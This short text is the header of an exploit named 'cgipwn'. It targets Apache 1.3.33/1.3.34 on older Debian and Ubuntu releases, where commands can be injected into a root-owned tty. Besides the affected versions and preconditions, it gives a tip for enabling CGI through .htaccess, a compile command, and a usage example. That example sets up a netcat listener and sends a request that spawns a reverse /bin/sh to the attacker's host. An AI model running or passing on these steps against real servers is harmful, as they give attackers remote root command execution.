  Description: Local attacker can influence Apache to direct commands
    into an open tty owned by user who started apache process, usually root.
    This results in arbitrary command execution.
  Affects: Apache 1.3.33/1.3.34 on Debian Stable/Testing/Unstable/Experimental     and Ubuntu Warty (4.10)/Hoary (5.04)/Breezy (5.10)/Dapper (6.06)
    Edgy (6.10), Feisty (7.04).
  Notes: Must have CGI execution privileges and
    service started manually by root via shell.
    Also try adding "Options +ExecCGI" to your .htaccess file.
  Compile: gcc -o /path/to/cgi-bin/cgipwn cgipwn.c
  Usage: nc -vvv -l -p 31337
    http://webserver/cgi-bin/cgipwn?nc%20myhost%2031337%20-e%20%2fbin%2f/sh%0d
